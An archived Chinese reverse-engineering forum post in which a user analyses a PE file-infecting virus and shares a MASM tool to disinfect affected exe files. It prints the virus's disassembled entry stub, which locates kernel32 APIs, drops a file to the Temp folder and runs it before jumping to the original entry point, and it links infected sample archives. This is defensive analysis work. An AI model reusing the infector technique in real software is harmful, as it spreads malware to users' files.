@@ -1,0 +1,771 @@
+
+# 修复染毒文件
+
+> 原文：[`www.pediy.com/kssd/pediy10/94608.html`](https://www.pediy.com/kssd/pediy10/94608.html)
+
+该死的病毒修改了硬盘上几乎所有的 `exe` 文件，重装系统无所谓，那些宝贝文件怎么办，卡巴提示有毒，无法清除，想给我都删了，那可不行，无奈写了个修复文件，漏洞百出，希望高手指正一下！多谢！
+
+染毒文件运行生成如下文件：
+
+文件运行后创建系统服务并删除自身，其中一个服务是（只取一部分）：
+
+```
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\6to4]
+"ErrorControl"=dword:00000001
+"ImagePath"=%SystemRoot%\System32\svchost.exe -k netsvcs
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\6to4\Parameters]
+"ServiceDll"=C:\WINDOWS\system32\6to4.dll
+```
+
+主要工作是系统 `system32` 下的几个 `dll`，希望大侠指定如何动态调试那几个 `dll`，他们是 `svchost.exe`，调用的吗？还是别的系统文件。
+
+## 染毒文件简要分析
+
+```
+0040E000 >  E8 00000000     call    0040E005       入口，那个 call 和 pop 病毒惯用的重定位方法
+0040E005    5B             pop     ebx
+0040E006    81EB 05024000  sub     ebx, 00400205   
+0040E00C    64:8B3D 3000000>mov    edi, dword ptr fs:[30]
+0040E013    8B7F 0C        mov     edi, dword ptr [edi+C]
+0040E016    8B7F 1C        mov     edi, dword ptr [edi+1C]
+0040E019    8B3F           mov     edi, dword ptr [edi]
+0040E01B    8B7F 08        mov     edi, dword ptr [edi+8]
+0040E01E    89BB C2034000  mov     dword ptr [ebx+4003C2], edi
+0040E024    8BF7           mov     esi, edi
+0040E026    0376 3C        add     esi, dword ptr [esi+3C]
+0040E029    8B76 78        mov     esi, dword ptr [esi+78]
+0040E02C    03F7           add     esi, edi
+0040E02E    56             push    esi
+0040E02F    8B6E 18        mov     ebp, dword ptr [esi+18]
+0040E032    8B76 20        mov     esi, dword ptr [esi+20]
+0040E035    03F7           add     esi, edi
+0040E037    33D2           xor     edx, edx
+0040E039    56             push    esi
+0040E03A    8B3E           mov     edi, dword ptr [esi]
+0040E03C    03BB C2034000  add     edi, dword ptr [ebx+4003C2]   通过 kennel32 的导出表暴力搜索 GetProcAddress
+0040E042    8DB3 87034000  lea     esi, dword ptr [ebx+400387]
+0040E048    B9 0F000000    mov     ecx, 0F
+0040E04D    F3:A6          repe    cmps byte ptr es:[edi], byte ptr>
+0040E04F    75 06          jnz     short 0040E057
+0040E051    5E             pop     esi
+0040E052    8BD6           mov     edx, esi
+0040E054    5E             pop     esi
+0040E055    EB 11          jmp     short 0040E068
+0040E057    5E             pop     esi
+0040E058    83C6 04        add     esi, 4
+0040E05B    42             inc     edx
+0040E05C    3BD5           cmp     edx, ebp
+0040E05E   ^ 72 D9        jb      short 0040E039  ；循环比较，暴力搜索
+0040E060    83EC 04        sub     esp, 4
+0040E063    E9 1A010000    jmp     0040E182                          
+0040E068    2B56 20        sub     edx, dword ptr [esi+20]
+0040E06B    8B83 C2034000  mov     eax, dword ptr [ebx+4003C2]
+0040E071    2BD0           sub     edx, eax
+0040E073    D1EA           shr     edx, 1
+0040E075    0356 24        add     edx, dword ptr [esi+24]
+0040E078    03D0           add     edx, eax
+0040E07A    0FB702         movzx   eax, word ptr [edx]
+0040E07D    C1E0 02        shl     eax, 2
+0040E080    0346 1C        add     eax, dword ptr [esi+1C]
+0040E083    0383 C2034000  add     eax, dword ptr [ebx+4003C2]
+0040E089    8B00           mov     eax, dword ptr [eax]
+0040E08B    0383 C2034000  add     eax, dword ptr [ebx+4003C2]
+0040E091    8BF8           mov     edi, eax 到此找到 eax=7C80ADB0  (kernel32.GetProcAddress)
+0040E093    8BEC           mov     ebp, esp
+0040E095    8B93 C2034000  mov     edx, dword ptr [ebx+4003C2]
+0040E09B    8D83 96034000  lea     eax, dword ptr [ebx+400396]
+0040E0A1    50             push    eax
+0040E0A2    52             push    edx
+0040E0A3    FFD7           call    edi   取 "GetTempPathA"的地址
+0040E0A5    81EC 04010000  sub     esp, 104
+0040E0AB    54             push    esp
+0040E0AC    68 04010000    push    104
+0040E0B1    FFD0           call    eax     取临时文件的路径; kernel32.GetTempPathA
+0040E0B3    8D83 A3034000  lea     eax, dword ptr [ebx+4003A3]
+0040E0B9    50             push    eax
+0040E0BA    8B93 C2034000  mov     edx, dword ptr [ebx+4003C2]
+0040E0C0    52             push    edx
+0040E0C1    FFD7           call    edi          
+0040E0C3    8D8B AC034000  lea     ecx, dword ptr [ebx+4003AC]
+0040E0C9    51             push    ecx
+0040E0CA    8BCC           mov     ecx, esp
+0040E0CC    83C1 04        add     ecx, 4
+0040E0CF    51             push    ecx
+0040E0D0    FFD0           call    eax   路径与 tem81.exe 组合
+0040E0D2    8D83 B6034000  lea     eax, dword ptr [ebx+4003B6]
+0040E0D8    50             push    eax
+0040E0D9    8B93 C2034000  mov     edx, dword ptr [ebx+4003C2]
+0040E0DF    52             push    edx
+0040E0E0    FFD7           call    edi       取 "CreateFileA"的地址
+0040E0E2    8BCC           mov     ecx, esp
+0040E0E4    6A 00          push    0
+0040E0E6    68 80000000    push    80
+0040E0EB    6A 02          push    2
+0040E0ED    6A 00          push    0
+0040E0EF    6A 00          push    0
+0040E0F1    68 000000C0    push    C0000000
+0040E0F6    51             push    ecx
+0040E0F7    FFD0           call    eax       
+创建文件 "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\tem81.exe"
+0040E0F9    8BF0           mov     esi, eax
+0040E0FB    8D8B ED034000  lea     ecx, dword ptr [ebx+4003ED]
+0040E101    51             push    ecx
+0040E102    51             push    ecx
+0040E103    8B93 C2034000  mov     edx, dword ptr [ebx+4003C2]
+0040E109    52             push    edx
+0040E10A    FFD7           call    edi
+0040E10C    59             pop     ecx
+0040E10D    6A 00          push    0
+0040E10F    51             push    ecx
+0040E110    83C1 0A        add     ecx, 0A
+0040E113    8B11           mov     edx, dword ptr [ecx]
+0040E115    52             push    edx
+0040E116    51             push    ecx
+0040E117    BA 4D5A9000    mov     edx, 905A4D
+0040E11C    8911           mov     dword ptr [ecx], edx
+0040E11E    56             push    esi
+0040E11F    FFD0           call    eax
+将内容写入文件，此时堆栈
+0012FEAC   00000044     文件句柄
+0012FEB0   0040E1F7     缓冲区，存放要写入的内容
+0012FEB4   00005C00     写入的大小
+0012FEB8   0040E1ED     
+0012FEBC   00000000
+0040E121    8D83 D5034000  lea     eax, dword ptr [ebx+4003D5]
+0040E127    50             push    eax
+0040E128    8B93 C2034000  mov     edx, dword ptr [ebx+4003C2]
+0040E12E    52             push    edx
+0040E12F    FFD7           call    edi
+0040E131    56             push    esi
+0040E132    FFD0           call    eax
+0040E134    8D83 C6034000  lea     eax, dword ptr [ebx+4003C6]
+0040E13A    50             push    eax
+0040E13B    8B93 C2034000  mov     edx, dword ptr [ebx+4003C2]
+0040E141    52             push    edx
+0040E142    FFD7           call    edi   取"CreateProcessA"的地址，准备运行那个该死的文件
+0040E144    83EC 44        sub     esp, 44
+0040E147    8BD4           mov     edx, esp
+0040E149    BE 00000000    mov     esi, 0
+0040E14E    B9 11000000    mov     ecx, 11
+0040E153    8932           mov     dword ptr [edx], esi
+0040E155    83C2 04        add     edx, 4
+0040E158   ^ E2 F9        loopd   short 0040E153 栈顶清 0，构造 CreateProcessA 所需的运行环境
+0040E15A    BA 44000000    mov     edx, 44
+0040E15F    891424         mov     dword ptr [esp], edx
+0040E162    83EC 10        sub     esp, 10
+0040E165    8BD4           mov     edx, esp
+0040E167    54             push    esp
+0040E168    83C2 10        add     edx, 10
+0040E16B    52             push    edx
+0040E16C    6A 00          push    0
+0040E16E    6A 00          push    0
+0040E170    6A 00          push    0
+0040E172    6A 00          push    0
+```
+
+
+
+## 汇编代码段
+
+```
+0040E174    6A 00           push    0  
+
+0040E176    6A 00           push    0  
+
+0040E178    6A 00           push    0  
+
+0040E17A    83C2 44         add     edx, 44  
+
+0040E17D    52              push    edx  
+
+0040E17E    FFD0            call    eax          运行刚生成的那个文件  
+
+0040E180    8BE5            mov     esp, ebp  
+
+0040E182  - E9 452FFFFF     jmp     004010CC      跳向原始的 oep  
+```
+
+## 染毒文件与原始文件在 PE 头和节表处的不同
+
+【比较数据是用现写的 hello 比较的，因为原来的都感染了，没法比较】
+
+* `CE`: `04` `05` 区段+1  
+* `D0`: `2A` `53` 文件创建时间  
+* `D1`: `68` `6A`  
+* `D2`: `6A` `6D`  
+* `E5`: `04` `64` 所含代码节的总大小 +6000  
+* `F0`: `20` `00`  
+* `F1`: `13` `50` 入口 oep  
+* `119`: `50` `B0` 内存中整个 PE 映像尺寸+6000  
+* `120`: `87` `B3`  
+* `121`: `C7` `C9` CheckSum  
+* `260`: `00` `2E`  
+* `261`: `00` `2E`  
+* `264`: `00` `20`  
+* `265`: `00` `13` 增加的区段  
+* `269`: `00` `60`  
+* `26D`: `00` `50`  
+* `271`: `00` `5E`  
+* `275`: `00` `14`  
+* `282`: `00` `67`  
+* `284`: `00` `20`  
+* `287`: `00` `E0`  
+
+**21 差异 找到。**
+
+## 染毒代码分析
+
+染毒代码不会...
+
+根据以上特征，写的文件修复工具【见附件】，有些疑问，还请高手指点。
+
+1. 遍历硬盘文件时如何快速确认文件是否 `win32pe` 文件，如果打开后比较`"MZ"` `"PE"`会有异常啊！
+2. 我的代码中 `seh` 处理好像不对，不知错在哪里了。
+3. 非标准格式的那个样本我的软件修复不了，主要是 `oep` 找不到，在他的 `pe` 头偏移 `28h` 处好像不是 `oep`？？
+4. 动态调试那几个干活的 `dll`，不知如何下手！
+
+## 我的思路
+
+```
+.386  
+
+.model flat,stdcall  
+
+option casemap:none  
+
+include windows.inc  
+
+include kernel32.inc  
+
+includelib kernel32.lib  
+
+include user32.inc  
+
+includelib user32.lib  
+
+ DLG_MAIN equ  1000  
+
+ IDC_EDT1 equ   1001  
+
+ IDC_BTN1 equ   1002  
+
+ IDC_BTN2 equ   1003  
+
+ IDC_BTN3 equ   1004  
+
+ ICO_1 equ   1005  
+
+.data  
+
+hInstance dd ?  
+
+hWinMain dd ?  
+
+hEdit dd ?  
+
+szWait db "准备就绪......",0  
+
+szFinish db "指定路径扫描完毕",0  
+
+szFilter db "\*.\*",0  
+
+szFmt db "%s    修复成功",0dh,0ah,0  
+
+szFmt2 db "%s    非标准 pe 文件，修复失败",0dh,0ah,0  
+
+szOut db MAX_PATH dup (?)  
+
+path1 db MAX_PATH dup (?)  
+
+path2 db MAX_PATH dup (?)  
+
+path3 db MAX_PATH dup (?)  
+
+szDllEdit   db      'RichEd20.dll',0  
+
+szClassEdit db  'RichEdit20A',0  
+
+hDll dd ?  
+
+lpExe db ".exe",0  
+
+lpSafe dd ?  
+
+hEdit2 dd ?  
+
+.code  
+
+_Seh proc  _lpExceptionRecord,_lpSEH, _lpContext,_lpDispatcherContext  
+
+                 pushad  
+
+                 mov     edi,_lpContext     ;这个异常处理不行呀？？不知哪里有问题  
+
+                 assume  edi:ptr CONTEXT  
+
+     push lpSafe  
+
+     pop  [edi].regEip  
+
+                 assume  edi:nothing  
+
+                 popad  
+
+                 mov     eax,ExceptionContinueExecution  
+
+                 ret  
+
+_Seh endp  
+
+_unLock proc lpFileName  
+
+  LOCAL @hFile,@hFileMap,@hFileData,@Edge  
+
+  pushad  
+
+    mov lpSafe,offset _SehC  
+
+  assume fs:nothing  
+
+  push offset _Seh  
+
+  push fs:[0]  
+
+  mov fs:[0],esp  
+
+  mov esi,lpFileName  
+
+  invoke lstrlen,lpFileName  
+
+  add esi,eax  
+
+  sub esi,4  
+
+  lea edi,offset lpExe  
+
+  mov ecx,4  
+
+  repz cmpsb                         ;判断扩展名是不是 exe，未处理大小写  
+
+.if ecx==0  
+
+  invoke CreateFile,lpFileName,GENERIC_READ or GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL  
+
+    .if eax!=INVALID_HANDLE_VALUE  
+
+    mov @hFile,eax  
+
+  invoke CreateFileMapping,@hFile,0,PAGE_READWRITE,0,0,NULL  
+
+    mov @hFileMap,eax  
+
+  invoke MapViewOfFile,eax,FILE_MAP_WRITE,0,0,0  
+
+  mov @hFileData,eax  
+
+  ;==============================================================打开文件并创建内存映射  
+
+  .if word ptr [eax]==5a4dh          ;文件类型判断有什么好办法呀？  
+
+    mov esi,eax  
+
+    assume esi:ptr IMAGE_DOS_HEADER       ;碰到 16 位的 exe 或非标准 pe 就不好弄了？？？  
+
+    add esi,[esi].e_lfanew  
+
+    invoke GetFileSize,@hFile,0  
+
+    add eax,@hFileData  
+
+    mov @Edge,eax  
+
+  .if esi<=eax  
+
+    mov eax,sizeof IMAGE_DOS_HEADER  
+
+    mov ebx,[esi].e_lfanew  
+
+     .IF ebx>=EAX  
+
+    .if dword ptr [esi]==00004550h;========================判断是否 pe 文件  
+
+      assume esi:ptr IMAGE_NT_HEADERS  
+
+      movzx ecx,[esi].FileHeader.NumberOfSections  
+
+      mov edi,esi  
+
+      add edi,sizeof IMAGE_NT_HEADERS  
+
+      assume edi:ptr IMAGE_SECTION_HEADER  
+
+      mov eax,sizeof IMAGE_SECTION_HEADER  
+
+      dec ecx  
+
+      mul ecx  
+
+      add edi,eax ;====================================找到最后一个区段  
+
+      .if dword ptr [edi]==2e2eh && [edi].SizeOfRawData==5e00h && [edi].Characteristics==0e0000020h  
+
+                ;========符合条件就认为已经感染病毒  
+
+        mov eax,@hFileData  
+
+        add eax,[edi].PointerToRawData      ;oep 距文件头  
+
+        add eax,183h  
+
+      .if eax>@Edge  
+
+        mov eax,dword ptr [eax]  
+
+        mov edx,[edi].VirtualAddress  
+
+        add edx,182h  
+
+        add eax,edx  
+
+        add eax,5  
+
+        mov [esi].OptionalHeader.AddressOfEntryPoint,eax  
+
+            ;==================================修正 oep  
+
+        mov eax,[esi].OptionalHeader.SizeOfImage  
+
+        sub eax,6000h  
+
+        mov [esi].OptionalHeader.SizeOfImage,eax  
+
+                ;=========修正映像尺寸  
+
+        mov eax,[esi].OptionalHeader.SizeOfCode  
+
+        sub eax,6000h  
+
+        mov [esi].OptionalHeader.SizeOfCode,eax  
+
+        ;    ==================================修正代码段尺寸  
+
+        movzx eax,[esi].FileHeader.NumberOfSections  
+
+        dec eax  
+
+        mov [esi].FileHeader.NumberOfSections,ax  
+
+            ;==================================修正节数量  
+
+        mov ecx,sizeof IMAGE_SECTION_HEADER  
+
+        XOR EAX,EAX  
+
+        rep stosb  
+
+            ;=================================病毒段信息清 0  
+
+        invoke UnmapViewOfFile,@hFileData  
+
+        invoke CloseHandle,@hFileMap  
+
+        invoke CloseHandle,@hFile  
+
+            ;==================================关闭内存映像  
+
+        invoke CreateFile,lpFileName,GENERIC_READ or GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL  
+
+          mov @hFile,eax  
+
+        invoke GetFileSize,eax,0     ;重新打开文件并得到文件大小  
+
+        sub eax,5e00h      ;减去病毒增加尺寸  
+
+        invoke SetFilePointer,@hFile,eax,0,FILE_BEGIN ;文件指针指到原始结尾处  
+
+        invoke SetEndOfFile,@hFile                ;设定新尺寸  
+
+        invoke CloseHandle,@hFile  
+
+          invoke wsprintf,offset szOut,offset szFmt,lpFileName  
+
+          invoke SendMessage,hEdit,EM_REPLACESEL,FALSE,offset szOut  
+
+        pop fs:[0]  
+
+        pop eax  
+
+        popad  
+
+        ret  
+
+      .endif  
+
+      invoke wsprintf,offset szOut,offset szFmt2,lpFileName  
+
+      invoke SendMessage,hEdit2,EM_REPLACESEL,FALSE,offset szOut  
+
+      .endif  
+
+      assume esi:nothing  
+
+      assume edi:nothing  
+
+    .endif  
+
+    .endif  
+
+  .endif  
+
+    assume esi:nothing  
+
+  .endif  
+
+  invoke UnmapViewOfFile,@hFileData  
+
+  invoke CloseHandle,@hFileMap  
+
+  invoke CloseHandle,@hFile  
+
+.endif  
+
+.endif  
+
+_SehC:  
+
+       pop     fs:[0]  
+
+       pop     eax  
+
+  popad  
+
+  ret  
+
+_unLock endp  
+
+_Scan proc Drive                             
+
+LOCAL @hFind  
+
+LOCAL @stFindData:WIN32_FIND_DATA  
+
+pushad  
+
+invoke lstrcpy,offset path1,Drive  
+
+invoke lstrlen,offset offset path1                    ;本段遍历磁盘文件，不知写的有没有问题，请指教  
+
+lea esi,path1  
+
+add esi,eax  
+
+.if byte ptr [esi-1]!="\\"  
+
+  mov byte ptr [esi],"\"  
+
+  mov byte ptr [esi+1],0  
+
+.endif  
+
+invoke RtlZeroMemory,offset path2,sizeof path2  
+
+invoke lstrcpy,offset path2,offset path1  
+
+invoke lstrcat,offset path2,offset szFilter  
+
+invoke FindFirstFile,offset path2,addr @stFindData  
+
+  .if eax!=INVALID_HANDLE_VALUE  
+
+  mov @hFind,eax  
+
+    .repeat  
+
+      invoke RtlZeroMemory,offset path3,sizeof path3  
+
+      invoke lstrcpy,offset path3,offset path1  
+
+      invoke lstrcat,offset path3,addr @stFindData.cFileName  
+
+      .if @stFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY  
+
+        .if byte ptr [@stFindData.cFileName]!="."  
+
+          invoke _Scan,offset path3  
+
+          lea esi,path1  
+
+          invoke lstrlen,offset path1  
+
+          add esi,eax  
+
+          invoke lstrlen,addr @stFindData.cFileName  
+
+          sub esi,eax  
+
+          mov byte ptr [esi-1],0  
+
+        .endif  
+
+      .else  
+
+        invoke _unLock,offset path3  
+
+      .endif  
+
+      invoke FindNextFile,@hFind,addr @stFindData  
+
+    .until eax==FALSE  
+```
+
+
+
+```
+invoke FindClose,@hFind  
+
+.endif  
+
+popad  
+
+ret  
+
+_Scan endp  
+
+_rePair proc  
+
+ LOCAL @szBuffer[108]:byte  ;用于存放磁盘盘符  
+
+ invoke RtlZeroMemory,addr @szBuffer,sizeof @szBuffer  ;缓冲区清 0  
+
+ invoke GetLogicalDriveStrings,sizeof @szBuffer,addr @szBuffer ;有多少磁盘全部取出放入缓冲区  
+
+ lea esi,@szBuffer  
+
+ .repeat  
+
+   push esi  
+
+   invoke _Scan,esi  
+
+   pop esi  
+
+   add esi,4  
+
+ .until dword ptr [esi]==0  
+
+ invoke wsprintf,offset szOut,offset szFmt,offset szFinish  
+
+ invoke SendMessage,hEdit,EM_REPLACESEL,FALSE,offset szOut  
+
+ ret  
+
+_rePair endp  
+
+_DlgProc proc uses ebx esi edi hWnd,uMsg,wParam,lParam  
+
+ LOCAL @stRect:RECT  
+
+ mov eax,uMsg  
+
+ .if eax==WM_CLOSE  
+
+   invoke EndDialog,hWinMain,NULL  
+
+ .elseif eax==WM_SIZE  
+
+   invoke GetClientRect,hWinMain,addr @stRect  
+
+   mov esi,@stRect.right  
+
+   sub esi,@stRect.left  
+
+   mov edi,@stRect.bottom  
+
+   sub edi,@stRect.top  
+
+   sub edi,60  
+
+   mov ebx,edi  
+
+   shr edi,1  
+
+   sub edi,5  
+
+   invoke MoveWindow,hEdit,0,0,esi,edi,TRUE  
+
+   add edi,0ah  
+
+   invoke MoveWindow,hEdit2,0,edi,esi,160,TRUE   
+
+
+ .elseif eax==WM_INITDIALOG  
+
+   push hWnd  
+
+   pop hWinMain  
+
+   invoke LoadIcon,hInstance,ICO_1  
+
+   INVOKE SendMessage,hWinMain,WM_SETICON,ICON_BIG ,eax  
+
+    invoke  CreateWindowEx,WS_EX_CLIENTEDGE,offset szClassEdit,NULL,WS_CHILD OR WS_VISIBLE OR WS_VSCROLL OR WS_HSCROLL OR ES_MULTILINE or ES_NOHIDESEL,0,0,0,0,hWinMain,0,hInstance,NULL  
+
+   mov hEdit,eax  
+
+   invoke  CreateWindowEx,WS_EX_CLIENTEDGE,offset szClassEdit,NULL,WS_CHILD OR WS_VISIBLE OR WS_VSCROLL OR WS_HSCROLL OR ES_MULTILINE or ES_NOHIDESEL,0,0,0,0,hWinMain,0,hInstance,NULL  
+
+   mov hEdit2,eax  
+
+   invoke SendMessage,hEdit,WM_SETTEXT,0,offset szWait  
+
+ .elseif eax==WM_COMMAND  
+
+   mov eax,wParam  
+
+     .if ax==IDC_BTN1  
+
+     call _rePair  
+
+     .endif  
+
+ .else  
+
+   mov eax,FALSE  
+
+   ret  
+
+ .endif  
+
+ mov eax,TRUE  
+
+ ret  
+
+_DlgProc endp  
+
+start:  
+
+invoke LoadLibrary,offset szDllEdit  
+
+mov hDll,eax  
+
+invoke GetModuleHandle,NULL  
+
+mov hInstance,eax  
+
+invoke DialogBoxParam,hInstance,DLG_MAIN,NULL,_DlgProc,NULL  
+
+invoke FreeLibrary,hDll  
+
+invoke ExitProcess,NULL  
+
+end start
+```
+
+上传的附件
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | | 标准 pe 格式带毒样本.rar [请到论坛下载：`bbs.pediy.com/showthread.php?t=94608`] |
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | | 非标准 pe 格式带毒样本.rar |
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | | 修复.rar |
